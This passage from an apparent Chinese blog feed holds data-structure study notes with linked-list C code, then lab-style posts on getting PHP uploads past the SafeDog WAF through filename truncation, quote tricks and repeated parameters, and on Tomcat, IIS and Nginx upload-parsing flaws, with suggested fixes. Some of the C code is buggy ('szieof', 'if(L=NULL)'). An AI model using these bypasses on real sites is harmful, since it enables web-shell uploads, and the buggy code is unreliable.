class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">DeleteNDode</span><span class="hljs-params">(DNode *p)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (p==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    DNode *q = p-&gt;next;  <span class="hljs-comment">//找到p的后继节点q</span><br>    <span class="hljs-keyword">if</span>(q==<span class="hljs-literal">NULL</span>)          <span class="hljs-comment">//p没有后继结点情况</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    p-&gt;next=q-&gt;next;<br>    <span class="hljs-keyword">if</span>(q-&gt;next!=<span class="hljs-literal">NULL</span>)    <span class="hljs-comment">//</span><br>        q-&gt;next-&gt;prior=p;<br>    <span class="hljs-built_in">free</span>(q);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="16-循环链表"><a href="#16-循环链表" class="headerlink" title="16.循环链表"></a>16.循环链表</h4><ul><li>循环单链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;LNode,*LinkList;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(LinkList &amp;L)</span><br>&#123;<br>    L = (LNode *)<span class="hljs-built_in">malloc</span>(szieof(LNode));<br>    <span class="hljs-keyword">if</span>(L=<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    L-&gt;next = L;     <span class="hljs-comment">//头结点next指向头结点</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>循环双链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">prior</span>,*<span class="hljs-title">next</span>;</span><br>&#125;DNode,*DLinkList;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">InitDLinkList</span><span class="hljs-params">(DLinkList &amp;L)</span><br>&#123;<br>    L = (DNode *)<span class="hljs-built_in">malloc</span>(szieof(DNode));<br>    <span class="hljs-keyword">if</span>(L=<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    L-&gt;prior = L;<br>    L-&gt;next = L;     <span class="hljs-comment">//头结点next指向头结点</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="17-静态链表（考察不多）"><a href="#17-静态链表（考察不多）" class="headerlink" title="17.静态链表（考察不多）"></a>17.静态链表（考察不多）</h4><p>&emsp;&emsp;静态链表：分配一整片连续的内存空间，所有结点集中安置</p><ul><li>创建静态链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 10</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Ndoe</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-type">int</span> next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;适用于不支持指针的低级语言和数据元素数量固定不变的场景。</p><p>&emsp;</p><h4 id="18-顺序表vs链表"><a href="#18-顺序表vs链表" class="headerlink" title="18.顺序表vs链表"></a>18.顺序表vs链表</h4><ul><li><h6 id="逻辑结构："><a href="#逻辑结构：" class="headerlink" title="逻辑结构："></a>逻辑结构：</h6></li></ul><p>&emsp;&emsp;都属于线性表，都是线性结构</p><ul><li><h6 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h6></li></ul><p>&emsp;&emsp;顺序表是顺序存储，优点是支持随机存取，存储密度高，但是存在大片连续看见分配不方便，改变容量不方便；链表是链式存储，优点是离散的小空间分配方便，改变容量方便，但是存在不可随机存取，存储密度低的问题</p><ul><li><h6 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h6></li></ul><p>&emsp;&emsp;创建、销毁（考察不多）、增、删、改、查</p><ul><li><h6 id="问题举例"><a href="#问题举例" class="headerlink" title="问题举例"></a>问题举例</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C/5.jpg" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>绪论</title>
    <link href="/2022/09/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/"/>
    <url>/2022/09/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><h4 id="1-知识框架"><a href="#1-知识框架" class="headerlink" title="1.知识框架"></a>1.知识框架</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/1.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-结构的基本术语"><a href="#2-结构的基本术语" class="headerlink" title="2.结构的基本术语"></a>2.结构的基本术语</h4><p><strong>数据：</strong>信息的载体</p><p><strong>数据元素：</strong>数据的基本单位</p><p><strong>数据对象：</strong>具有系统性质的数据元素的集合，是数据的一个子集</p><p><strong>数据类型：</strong>原子类型、结构类型、抽象数据类型</p><p>&emsp;</p><h4 id="3-结构三要素"><a href="#3-结构三要素" class="headerlink" title="3.结构三要素"></a>3.结构三要素</h4><ul><li><h5 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h5></li></ul><p>&emsp;&emsp;逻辑结构是指数据元素之间的逻辑关系，它与数据的存储无关，是独立与计算机的。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/2.png" style="zoom:80%;" /></center><ul><li><h5 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h5></li></ul><p>&emsp;&emsp;存储结构是指数据在计算机中的表示（又称映像），也称为物理结构。数据的存储结构是用计算机语言实现的逻辑结构，依赖于计算机语言</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/3.png" style="zoom:80%;" /></center><ul><li><h5 id="数据的运算："><a href="#数据的运算：" class="headerlink" title="数据的运算："></a>数据的运算：</h5></li></ul><p>&emsp;&emsp;施加在数据上的运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤</p><p>&emsp;&emsp;</p><h4 id="4-算法的基本概念"><a href="#4-算法的基本概念" class="headerlink" title="4.算法的基本概念"></a>4.算法的基本概念</h4><p>&emsp;&emsp;算法是对特定问题求解步骤的一种描述。是指令的有限序列。一个算法应该具备的5个重要特征：</p><ul><li><strong>有穷性：</strong>一个算法必须总在执行有穷步之后结束，且每一步都可在有穷时间内完成</li><li><strong>确定性：</strong>算法中的每个指令都必须有确切的含义，对于相同的输入只能得出相同的输出</li><li><strong>可行性：</strong>算法中描述的操作都可以通过研究实现的基本运算执行有限次来实现</li><li><strong>输入：</strong>一个算法有零个或多个输入，这些输入取自于某中特定的对象的集合</li><li><strong>输出：</strong>一个算法有一个或多个输出，这些输出是与输入有着某种特定关系的量</li></ul><p>&emsp;</p><h4 id="5-算法的目标"><a href="#5-算法的目标" class="headerlink" title="5.算法的目标"></a>5.算法的目标</h4><ul><li><strong>正确性：</strong>能够正确的解决求解问题</li><li><strong>可读性：</strong>简洁可读，以帮助人理解</li><li><strong>健壮性：</strong>当输入非法数据时，算法能适当地作出反应或进行处理，二不会产生奇怪的输出结果</li><li><strong>效率与低存储量需求：</strong>效率是指算法执行的时间，存储量需求是指算法执行过程中所需要的最大存储空间</li></ul><p>&emsp;</p><h4 id="6-算法效率的度量"><a href="#6-算法效率的度量" class="headerlink" title="6.算法效率的度量"></a>6.算法效率的度量</h4><p>&emsp;&emsp;算法效率的度量是通过时间复杂度和空间复杂度来描述的</p><ul><li><h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5></li></ul><p>&emsp;&emsp;一个语句的频度是指该语句在算法中被重复执行的次数，算法中所有语句的频度之和记为*T(n)<em>，它是该算法问题规模n的函数，时间复杂度主要分析</em>T(n)<em>的数量级，算法中基本运算的频度与</em>T(n)<em>同数量级，因此通常采用算法中基本运算的频度</em>f(n)*来分析算法的时间复杂度：</p><center>    T(n)=O(f(n))</center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;时间复杂度加法规则：</p><center>    T(n) = T1(n) + T2(n) = O(f(n)) + O(g(n)) = O(max(f(n), g(n)))</center><p>&emsp;&emsp;时间复杂度乘法规则：</p><center>T(n) = T1(n)×T2(n) = O(f(n))×O(g(n)) = O(f(n)×g(n))</center><p>&emsp;&emsp;常见的渐近时间复杂度为：</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/5.jpg" style="zoom:80%;" /></center><ul><li><h5 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h5></li></ul><p>&emsp;&emsp;算法的空间复杂度S(n)定义为该算法所耗费的存储时间，它是问题规模n的函数，记为：</p><center>    S(n)=O(g(n))</center>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传——WAF绕过及修复</title>
    <link href="/2022/09/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/"/>
    <url>/2022/09/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传——WAF绕过及修复"><a href="#文件上传——WAF绕过及修复" class="headerlink" title="文件上传——WAF绕过及修复"></a>文件上传——WAF绕过及修复</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;在进行学习之前，我们需要了解在上传数据包的4个参数：</p><ul><li>Content-Disposition：一般可以更改</li><li>name：表单参数值，不能更改</li><li>filename：文件名，可以更改</li><li>Content-Type：文件MIME，视情况更改</li></ul><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/1.png" style="zoom:80%;" /></center><p>&emsp;以安全狗为例，在安全狗中是有着对应的文件检测功能</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/2.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到，在这个过程中，由于安全狗开启了php的防护功能，所以我们无法上传成功php脚本。常规绕过思路来讲，就是让WAF无法检测出是php或者使用非php语言的脚本（jsp等）。</p><p>&emsp;</p><h4 id="1-绕过方法——数据溢出（防止匹配xxx-后缀）"><a href="#1-绕过方法——数据溢出（防止匹配xxx-后缀）" class="headerlink" title="1.绕过方法——数据溢出（防止匹配xxx.后缀）"></a>1.绕过方法——数据溢出（防止匹配xxx.后缀）</h4><p>&emsp;&emsp;数据溢出的原理就是提供大量的数据；当数据特别多的时候，程序会有崩溃或者截止的办法，从而达到防止匹配的目的，比如我们一直增加文件名的数据</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/4.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/5.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到，当我们的垃圾数据足够多的时候，会导致后台的服务平台崩溃，这是一种办法，当然尽管崩溃了，我们依旧没办法成功上传php文件，这个位置显然不行，所以我们尝试另外的位置。</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/8.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;这种是绕过了WAF，并且也显示提交了，但是后台查看并没有上传的php文件的，后面在演示的过程中，在垃圾数据中加入了;，也就有了文件，这里需要注意</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/10.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/11.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-绕过方法——符号变异（防止匹配’”-）"><a href="#2-绕过方法——符号变异（防止匹配’”-）" class="headerlink" title="2.绕过方法——符号变异（防止匹配’”;）"></a>2.绕过方法——符号变异（防止匹配’”;）</h4><p>&emsp;&emsp;首先分析数据包的有效符号</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/12.png" style="zoom:80%;" /></center><p>&emsp;&emsp;要知道，在数据包中;代表语句结束，而我们可以看到在filename后面是没有;号的，我们可以尝试写个;上去并插入内容</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/13.png" style="zoom:80%;" /></center><p>&emsp;&emsp;显然没有成功，在注入中很多函数和符号存在等价替换，所以我们尝试使用单引号代替双引号。或者去掉一个双引号取消掉闭合影响他判断，这样子就有三中情况，第一种识别为”qq名字的php，第二种是无法匹配到，为没有最后一个”的闭合就直接放行了，第三种是直接扔掉</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/14.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/15.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/16.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到，我们最终绕过了安全狗成功上传了php文件，也就是说明安全狗匹配的是单引号和双引号之间的内容，是上面讲到的第二种：无法匹配到，为没有最后一个”的闭合，就直接放行了，所以成功了。再尝试把两个引号都去掉也是可以成功的。但当我们去掉前面的;，上传缺又失败了，所以最终得出安全狗的;号匹配是匹配最后的一个;。</p><p>&emsp;</p><h4 id="3-绕过方法——数据截断（-00-换行）"><a href="#3-绕过方法——数据截断（-00-换行）" class="headerlink" title="3.绕过方法——数据截断（%00  ;   换行）"></a>3.绕过方法——数据截断（%00  ;   换行）</h4><p>&emsp;&emsp;数据截断的原理和上一篇讲的内容差不多，也就是在上传的文件名字后加入相应的符号标识，对文件名数据进行截断从而绕过匹配</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/17.png" style="zoom:80%;" /></center><p>&emsp;&emsp;上传后还是被截断了，因为存在php的文件内容数据，所以还是被识别出来了，现在我们尝试使用;.进行操作。;代表一个语句的结束，所以当我们输入;后，安全狗只会匹配到;之前的内容，所以能绕过成功</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/18.png" style="zoom:80%;" /></center><p>&emsp;&emsp;还有换行技巧，当我们换行后，在安全狗中识别的内容是p\nh\np，显然在识别中使用了\n进行了验证的干扰，最后上传成功</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/19.png" style="zoom:80%;" /></center><p>&emsp;&emsp;这个版本的安全狗中，斜杆也能当做一种截断</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/25.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-绕过方法——重复数据（参数多次）"><a href="#4-绕过方法——重复数据（参数多次）" class="headerlink" title="4.绕过方法——重复数据（参数多次）"></a>4.绕过方法——重复数据（参数多次）</h4><p>&emsp;&emsp;顾名思义就是使用多个参数，首先我们创建两个参数，试探一下WAF以哪一个为准，检测哪一个</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/20.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/21.png" style="zoom:80%;" /></center><p>&emsp;&emsp;明显可以看到上传的是y.jpg文件，最终上传检测的是最后的文件名为准。我们就尝试将后面的文件名字改为php文件名，前多加许多的文件名参数，试探WAF是全部检测，还是存在检测上限</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/22.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见还是被拦截了，那就有两种可能， 一种是参数不够多，没有，一种是对面能够完全匹配所有参数，所以尝试加大参数的数量</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/23.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，当我们加大参数数据量时，最终绕过了安全狗，成功上传了php文件，也就是说该版本的安全狗并不是全部匹配，而是存在了一定的匹配次数，还有一种参数加入就是借用白名单的机制，当我们吧前面的数据复制到filename的引号中，当后台接收到内容时间，内容上的前部分会被忽略不计，安全狗就会误认为是正常数据就直接通过检测（说实话这里我没搞懂，可能是WAF部件的检测原理层面）</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/24.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="5-WAF绕过总结"><a href="#5-WAF绕过总结" class="headerlink" title="5.WAF绕过总结"></a>5.WAF绕过总结</h4><p>&emsp;&emsp;总的来说研究就是不断的测试，测试有一个先后的测试顺序，要明白哪些数据能够修改，哪些部分不能改动。把WAF的构造和匹配机制了解清楚，其实是能够有方法去进行漏洞查找的。</p><p>&emsp;&emsp;这里小迪视频中提供了两个比较好的测试Fuzz字典</p><ul><li><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p></li><li><p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p></li></ul><p>&emsp;&emsp;使用fuzz测试举例</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/26.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/27.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E4%BF%AE%E5%A4%8D/28.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-文件上传的安全修复方案"><a href="#6-文件上传的安全修复方案" class="headerlink" title="6.文件上传的安全修复方案"></a>6.文件上传的安全修复方案</h4><p>&emsp;&emsp;后端验证：采用服务端验证模式，然后采用以下内容的相关检测</p><ul><li>后缀验证：基于黑名单，白名单过滤</li><li>MIME检测：基于上传自带类型检测</li><li>内容检测：文件头，完整性验证</li></ul><p>&emsp;&emsp;自带函数过滤</p><ul><li>自带函数过滤：参考uploadlabs函数——getimage（该函数只能是图片）</li><li>自定义函数过滤：function check_file(){}</li><li>WAF防护产品：宝塔，云盾，安全公司产品等</li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传——CVE、中间件解析相关漏洞</title>
    <link href="/2022/09/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/09/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传——CVE、中间件解析相关漏洞"><a href="#文件上传——CVE、中间件解析相关漏洞" class="headerlink" title="文件上传——CVE、中间件解析相关漏洞"></a>文件上传——CVE、中间件解析相关漏洞</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;就生活而言文件上传的漏洞不仅仅是代码层面上的漏洞，有些时候也存在着搭建上传环境的服务漏洞或者是中间件中的解析漏洞，譬如CVE-2015-5254、CVE-2017-12615、CVE-2019-2618等等多种漏洞（可以在vulhub网站中搭建相关平台），有或者是Apache、Nginx等中间件平台的上传解析。我们一般用nmap进行端口扫描，查看对应版本查找相关漏洞</p><p>&emsp;</p><h4 id="1-CVE漏洞举例：CVE-2017-12615"><a href="#1-CVE漏洞举例：CVE-2017-12615" class="headerlink" title="1.CVE漏洞举例：CVE-2017-12615"></a>1.CVE漏洞举例：CVE-2017-12615</h4><p>&emsp;&emsp;2017年9月19日，Apache Tomcat官方确认的高位漏洞，漏洞CVE编号CVE-2017-12615。当在windows主机上运行Tomcat并启用HTTP PUT请求方式时，攻击者就可能通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件并使其被执行。影响版本为Apache Tomcat 7.0.0 - 7.0.81</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/1.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/2.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/3.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-IIS版本（解析漏洞-上传漏洞）"><a href="#2-IIS版本（解析漏洞-上传漏洞）" class="headerlink" title="2.IIS版本（解析漏洞+上传漏洞）"></a>2.IIS版本（解析漏洞+上传漏洞）</h4><p>&emsp;&emsp;在IIS6.0中，对文件夹而言，正常路径是image/qq.jpg，而如果是iamge.asp/qq.jpg，则qq.jpg就会被当做asp解析。对于文件而言，正常文件命名是image.jpg，而改为image.asp;.jpg或者是xxx.asp;xxx.jpg，则该文件就会被当做asp执行。在这当中asp可以换成php，如果换成php则就当php文件执行。</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/4.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/5.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-Nginx版本（解析漏洞-上传漏洞）"><a href="#3-Nginx版本（解析漏洞-上传漏洞）" class="headerlink" title="3.Nginx版本（解析漏洞+上传漏洞）"></a>3.Nginx版本（解析漏洞+上传漏洞）</h4><p>&emsp;&emsp;存在低版本的Nginx，在文件后面加入/xxx.php，那么这个文件就会被当做php文件执行，只要我们上传一个图片后缀的文件，使用此方法，就能插入恶意代码执行php代码内容</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/6.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/7.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/8.png" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94CVE%E7%AD%89%E6%BC%8F%E6%B4%9E/9.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-总结思路"><a href="#4-总结思路" class="headerlink" title="4.总结思路"></a>4.总结思路</h4><p>&emsp;&emsp;当给一个文件上传漏洞判断时，首先查看是否有二次渲染，然后当是没有代码的黑盒测试时，就需要盲猜是什么代码构造，最后就是看中间件一些服务平台的版本是否存在相关的上传缺陷或者解析漏洞</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传——内容逻辑数组绕过</title>
    <link href="/2022/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/"/>
